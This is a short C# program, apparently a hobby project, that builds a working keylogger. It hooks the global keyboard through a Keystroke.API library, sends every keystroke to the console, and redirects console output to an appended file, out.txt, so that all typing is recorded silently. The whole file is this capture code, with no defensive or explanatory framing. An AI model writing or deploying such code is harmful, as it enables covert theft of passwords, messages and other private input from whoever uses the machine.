using System;
using System.IO;
using System.Windows.Forms;
using Keystroke.API;

namespace keystroke
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");

            using (KeystrokeAPI api = new KeystrokeAPI())
            {

                

                api.CreateKeyboardHook(Console.Write);

                FileStream filestream = new FileStream("out.txt", FileMode.Append);
                StreamWriter streamwriter = new StreamWriter(filestream);
                streamwriter.AutoFlush = true;
                Console.SetOut(streamwriter);
                Console.SetError(streamwriter);

                Application.Run();


            }
        }
    }
}
